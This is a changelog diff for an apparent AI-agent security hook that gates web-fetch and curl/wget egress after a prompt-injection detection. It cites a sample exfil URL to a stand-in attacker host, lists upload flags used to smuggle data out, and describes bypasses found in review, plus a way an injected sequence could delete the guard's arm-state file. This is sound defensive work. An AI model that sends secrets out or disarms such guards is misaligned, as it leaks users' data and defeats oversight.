@@ -2,6 +2,63 @@
 
 All notable changes to this project. Format: [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
 
+## [7.5.0] — 2026-06-02
+
+Exfil-chain hardening (PR 3 of the staged review). Layer 6 (the inject→exfil
+break) now also covers the **web-fetch** channel, and the egress guard adopts the
+shared host library.
+
+### Security
+
+- **Web-fetch egress is now gated (#3a).** The exfiltration guard previously only
+  saw Bash, so the most natural post-injection exfil — having the model fetch
+  `attacker.com/?data=<secret>` — was ungated. The guard is now wired to the
+  web-fetch PreToolUse matcher as well: while armed (≤5 min after a HIGH), an
+  outbound fetch is escalated to ASK unless its host positively resolves to an
+  allowlisted domain. **Fails closed** — a fetch tool whose destination is in a
+  field we don't parse (`urls[]`, a search `.query`, …) ASKs rather than passing.
+- **Upload-aware allowlist (#3c).** A curl/wget that UPLOADS data
+  (`-d`/`--data*`/`-F`/`--form*`/`-T`/`--upload-file`/`--json`/`--url-query`/wget
+  `--post-data`/`--post-file`/`--body-*`) to an allowlisted host is no longer
+  exempted — exfil to a trusted host is still exfil. (scp/rsync *transfers* to an
+  allowlisted host stay exempt: the user explicitly trusted that destination.)
+- The egress guard now uses the shared `web-safety-lib.sh`
+  (`normalize_host` / `host_in_list`) for host parsing + allowlist matching,
+  ending the divergence with the URL pre-screen.
+
+### Fixed (false positives, #11)
+
+- **HTTPie detection by argument shape.** `HTTPIE_RE` previously matched any
+  command containing the substring `https `; it now matches the `http`/`https`
+  binary by its argument (an HTTP method, a URL/host, a `:port`, a scheme, or a
+  flag), so `env http POST …`, backtick-wrapped httpie, etc. are still caught
+  while a prose mention (`echo see https for details`) is not.
+- **rsync only when remote.** `rsync` is treated as egress only with a remote spec
+  (`host:path` / `user@host:path`); a purely local `rsync /tmp/a /tmp/b` no longer
+  asks.
+
+### Security gate
+
+- Reviewed pre-commit by the cross-model gate (Codex + security-auditor). The
+  first cut had residual exfil bypasses — non-`.url` MCP fetch fields, HTTPie via
+  backtick/`env`, and missing curl/wget upload flags — each now closed and
+  regression-tested; the re-verification pass confirmed all closed with no fresh
+  bypass.
+
+### Known limitations (documented, by design)
+
+- The arm-state is a `/tmp` file; a multi-step injected sequence could `rm` it
+  before exfil. The guard raises the bar (a single command can't both disarm and
+  exfil — the PreToolUse check runs first) but is defense-in-depth, not a hard gate.
+- A GET smuggling a secret in the query string to an **allowlisted** host stays
+  exempt (the user positively trusted that destination).
+- The HTTPie arg-shape match accepts a rare prose FP (`… https GET …`) → ASK, only
+  while armed and only on a Bash command.
+
+### Notes
+
+- Suites: scanner 42, cmd 45, egress 71 — all green.
+
 ## [7.4.0] — 2026-06-02
 
 Coverage, false-positive, and log-integrity fixes from the same full-codebase
